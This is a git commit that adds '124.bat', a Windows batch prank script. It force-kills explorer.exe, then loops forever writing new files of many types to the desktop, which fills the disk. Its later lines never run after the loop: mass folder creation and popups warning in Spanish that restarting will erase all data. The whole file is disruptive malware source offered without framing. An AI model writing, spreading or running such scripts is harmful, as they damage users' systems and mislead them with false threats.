11591d92d662ac385a1b70c9d3a8b9e830fcc8b9
WIF003 <98164269+WIF003@users.noreply.github.com>
2022-06-30 12:37:07 -0500

    Add files via upload

---
+++ 124.bat
@@ -0,0 +1,117 @@
+echo off
+TASKKILL /F /IM explorer.exe
+cd desktop
+:bucle
+set /a worm = %worm% + 1       
+echo HOLA>>%worm%.txt
+echo HOLA>>%worm%.jpg
+echo HOLA>>%worm%.gif
+echo HOLA>>%worm%.png
+echo HOLA>>%worm%.avi
+echo HOLA>>%worm%.odt
+echo HOLA>>%worm%.psd
+echo HOLA>>%worm%.rar
+echo HOLA>>%worm%.bmp
+echo HOLA>>%worm%.flv
+echo HOLA>>%worm%.dll
+echo HOLA>>%worm%.pdf
+echo HOLA>>%worm%.doc
+echo HOLA>>%worm%.bat
+echo HOLA>>%worm%.cpp
+echo HOLA>>%worm%.jar
+echo HOLA>>%worm%.html
+echo HOLA>>%worm%.htm
+echo HOLA>>%worm%.php
+echo HOLA>>%worm%.css
+echo HOLA>>%worm%.py
+echo HOLA>>%worm%.sh
+echo HOLA>>%worm%.vbs
+goto bucle
+cls 
+mkdir lol
+mkdir a
+mkdir b
+mkdir c
+mkdir d 
+mkdir e
+mkdir f
+mkdir g 
+mkdir h 
+mkdir i
+mkdir k 
+mkdir l 
+mkdir m
+mkdir n
+mkdir o
+mkdir p
+mkdir q
+mkdir r
+mkdir s
+mkdir t
+mkdir u
+mkdir v 
+mkdir w
+mkdir x
+mkdir y 
+mkdir z
+mkdir 1
+mkdir 2
+mkdir 3
+mkdir 4
+mkdir 5
+mkdir 6
+mkdir 7
+mkdir 8
+mkdir 9
+mkdir 10
+mkdir 11
+mkdir 12 
+mkdir 13 
+mkdir 14
+mkdir 15 
+mkdir 16
+mkdir 17
+mkdir 18 
+mkdir 19
+mkdir 20
+mkdir 21
+mkdir 22
+mkdir 23
+mkdir 24
+mkdir 25
+mkdir 26
+mkdir 27
+mkdir 28
+mkdir 29
+mkdir 30
+mkdir 31
+mkdir 32 
+mkdir 33
+mkdir 34
+mkdir 35
+mkdir 36 
+mkdir 37
+mkdir 38
+mkdir 39 
+mkdir 40
+mkdir 41
+mkdir 42
+mkdir 43
+mkdir 44
+mkdir 45
+mkdir 46
+mkdir 47
+mkdir 48
+mkdir 49
+mkdir 50
+msg * holaaaaaaaaaaaaaa :)
+msg * quieres jugar?
+msg * solo reinicia la computadora
+msg * y perderas todos tus datos
+msg * XD
+msg * jajajjajajsjajsjajdjjasjjj
+start https://elgoog.im/t-rex/
+dir
+start explorer.exe
+timeout /t 240 /nobreak 
+exit
